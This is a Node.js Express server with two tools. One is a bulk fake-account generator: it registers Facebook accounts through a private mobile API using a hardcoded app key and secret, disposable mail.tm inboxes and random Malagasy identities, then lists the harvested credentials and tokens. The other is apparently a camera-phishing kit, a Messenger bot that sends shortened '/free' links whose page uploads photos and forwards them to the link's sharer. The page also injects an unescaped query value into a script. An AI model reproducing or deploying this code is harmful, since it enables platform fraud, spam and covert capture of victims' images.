require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();

const PAGE_ACCESS_TOKEN = process.env.token;
const VERIFY_TOKEN = 'veme';
const PORT = 8080;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use('/uploads', express.static('uploads'));
app.use(express.static('public'));


let createdAccounts = [];

const genRandomString = (length) => {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
};

// Random date of birth
const getRandomDate = (start, end) => {
  return new Date(start.getTime() + Math.random() * (end.getTime() - start.getTime()));
};

// Random Malagasy name generator
const getRandomName = () => {
  const firstNames = [
    'Toky', 'Fara', 'Mamy', 'Lova', 'Hery', 'Niry', 'Soa', 'Bema', 'Ony', 'Lala',
    'Hasina', 'Rina', 'Kanto', 'Fanja', 'Tantely', 'Zo', 'Voahirana', 'Ny Aina', 'Malala', 'Tahina',
    'Fitiavana', 'Mahery', 'Mialy', 'Nomenjanahary', 'Tsanta'
  ];

  const lastNames = [
    'Rakoto', 'Rasoanaivo', 'Randriamihaja', 'Andrianarisoa', 'Rasoa', 'Razafindrakoto',
    'Rakotondrazaka', 'Randrianarivelo', 'Raharimanana', 'Andrianantenaina',
    'Rabe', 'Rasoazanany', 'Rakotomalala', 'Razanadrakoto', 'Andriamanantena',
    'Ramananoro', 'Razafindrahaga', 'Randrianasolo', 'Ralison', 'Andriambelo',
    'Razanakolona', 'Randriambololona', 'Rakotovao', 'Rasolonjatovo', 'Andrianasolo'
  ];

  const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
  const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
  return { firstName, lastName };
};

// Fetch email domains from mail.tm
const getMailDomains = async () => {
  try {
    const res = await axios.get('https://api.mail.tm/domains');
    return res.data['hydra:member'];
  } catch {
    return null;
  }
};

// Create temporary email account
const createMailTmAccount = async () => {
  const domains = await getMailDomains();
  if (!domains) return null;

  const domain = domains[Math.floor(Math.random() * domains.length)].domain;
  const username = genRandomString(10);
  const password = genRandomString(12);
  const birthday = getRandomDate(new Date(1976, 0, 1), new Date(2004, 0, 1));
  const { firstName, lastName } = getRandomName();

  try {
    const res = await axios.post('https://api.mail.tm/accounts', {
      address: `${username}@${domain}`,
      password
    });

    if (res.status === 201) {
      return { email: `${username}@${domain}`, password, firstName, lastName, birthday };
    }
  } catch {
    return null;
  }
};

// Register account to Facebook
const registerFacebookAccount = async (email, password, firstName, lastName, birthday) => {
  const api_key = '882a8490361da98702bf97a021ddc14d';
  const secret = '62f8ce9f74b12f84c123cc23437a4a32';
  const gender = Math.random() < 0.5 ? 'M' : 'F';

  const req = {
    api_key,
    attempt_login: true,
    birthday: birthday.toISOString().split('T')[0],
    client_country_code: 'EN',
    fb_api_caller_class: 'com.facebook.registration.protocol.RegisterAccountMethod',
    fb_api_req_friendly_name: 'registerAccount',
    firstname: firstName,
    format: 'json',
    gender,
    lastname: lastName,
    email,
    locale: 'en_US',
    method: 'user.register',
    password,
    reg_instance: genRandomString(32),
    return_multiple_errors: true,
  };

  const sigString = Object.keys(req).sort().map(k => `${k}=${req[k]}`).join('') + secret;
  req.sig = crypto.createHash('md5').update(sigString).digest('hex');

  try {
    const res = await axios.post('https://b-api.facebook.com/method/user.register', new URLSearchParams(req), {
      headers: {
        'User-Agent': '[FBAN/FB4A;FBAV/35.0.0.48.273;FBDM/{density=1.33125,width=800,height=1205};FBLC/en_US;FBCR/;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/4.1.1;FBBK/0;]'
      }
    });

    return res.data;
  } catch {
    return null;
  }
};

app.post("/create", (req, res) => {
  const amount = parseInt(req.body.amount);
  if (!amount || amount <= 0) {
    return res.status(400).json({ error: "Invalid 'amount'" });
  }

  // Respond immediately
  res.json({ message: `Started creating ${amount} accounts in background.` });

  // Background task
  (async () => {
    const results = [];

    for (let i = 0; i < amount; i++) {
      const emailAccount = await createMailTmAccount();
      if (!emailAccount) continue;

      const fb = await registerFacebookAccount(
        emailAccount.email,
        emailAccount.password,
        emailAccount.firstName,
        emailAccount.lastName,
        emailAccount.birthday
      );

      if (fb && fb.new_user_id) {
        results.push({
          email: emailAccount.email,
          password: emailAccount.password,
          name: `${emailAccount.firstName} ${emailAccount.lastName}`,
          birthday: emailAccount.birthday.toISOString().split("T")[0],
          gender: fb.gender,
          userId: fb.new_user_id,
          token: fb.session_info?.access_token || null,
        });
      }
    }

    createdAccounts = createdAccounts.concat(results);
    console.log(`[+] Created ${results.length} accounts in background`);
  })();
});

app.get("/list", (req, res) => {
  res.json(createdAccounts);
});


// Multer setup for uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = './uploads';
    if (!fs.existsSync(dir)) fs.mkdirSync(dir);
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    cb(null, Date.now() + '-' + file.originalname);
  }
});
const upload = multer({ storage });

// Serve camera page dynamically with injected PSID
app.get('/free', (req, res) => {
  const id = req.query.id || '';
  const filePath = path.join(__dirname, 'public/camera.html');
  fs.readFile(filePath, 'utf8', (err, html) => {
    if (err) return res.status(500).send('Error loading page');
    const injected = html.replace('<!--__INJECT_ID__-->', `<script>const PSID = "${id}";</script>`);
    res.send(injected);
  });
});

// Webhook verification endpoint
app.get('/webhook', (req, res) => {
  const mode = req.query['hub.mode'];
  const token = req.query['hub.verify_token'];
  const challenge = req.query['hub.challenge'];

  if (mode && token === VERIFY_TOKEN) {
    return res.status(200).send(challenge);
  }
  res.sendStatus(403);
});

// Function to send message to Facebook user
async function sendMessage(recipientId, messageData) {
  await axios.post(
    `https://graph.facebook.com/v19.0/me/messages?access_token=${PAGE_ACCESS_TOKEN}`,
    {
      recipient: { id: recipientId },
      message: messageData
    }
  );
}

// Function to shorten URL using TinyURL public API (no API key)
async function shortenUrl(longUrl) {
  try {
    const res = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
    return res.data;
  } catch (err) {
    console.error('TinyURL error:', err.message);
    return longUrl; // fallback to original URL
  }
}

// Handle incoming messages from Facebook webhook
app.post('/webhook', async (req, res) => {
  const body = req.body;

  if (body.object === 'page') {
    for (const entry of body.entry) {
      for (const event of entry.messaging) {
        const senderId = event.sender.id;

        // Skip echoes and non-text messages
        if (!event.message || event.message.is_echo) continue;

        const messageText = event.message.text?.toLowerCase();

        if (messageText === '/generate') {
          const longUrl = `${req.protocol}://${req.get('host')}/free?id=${senderId}`;
          const shortUrl = await shortenUrl(longUrl);

          // Send quick reply with Open Camera
          await sendMessage(senderId, {
            text: "[By Somby Ny Aina] Copy this link:"
          });

          await sendMessage(senderId, { text: shortUrl });
        } else {
          await sendMessage(senderId, {
            text: "Nein. I don't understand.",
            quick_replies: [
              {
                content_type: "text",
                title: "/generate",
                payload: "GENERATE"
              }
            ]
          });
        }
      }
    }
    res.sendStatus(200);
  } else {
    res.sendStatus(404);
  }
});

app.post('/convert', upload.single('photo'), async (req, res) => {
  const { id, message } = req.body;

  if (!req.file) return res.status(400).json({ error: 'No photo uploaded' });

  const imageUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;
  res.json({ id, message, imageUrl });

  // Auto-send to Messenger if id is present
  if (id) {
    try {
      const payload = {
        id,
        imageUrl
      };
      if (message) payload.text = message;

      await axios.post(`${req.protocol}://${req.get('host')}/send`, payload);
    } catch (err) {
      console.error('Failed to auto-send to Messenger:', err.response?.data || err.message);
    }
  }
});

// /send endpoint to send message and/or image to Facebook user
app.post('/send', async (req, res) => {
  const { id, text, imageUrl } = req.body;
  if (!id || (!text && !imageUrl)) {
    return res.status(400).json({ error: 'Missing id and either text or imageUrl' });
  }

  try {
    // Send image if provided
    if (imageUrl) {
      await sendMessage(id, {
        attachment: {
          type: "image",
          payload: { url: imageUrl, is_reusable: true }
        }
      });
    }

    // Send text if provided
    if (text) {
      await sendMessage(id, { text });
    }

    res.json({ success: true });
  } catch (err) {
    console.error('Failed to send message:', err.response?.data || err.message);
    res.status(500).json({ error: 'Failed to send message' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});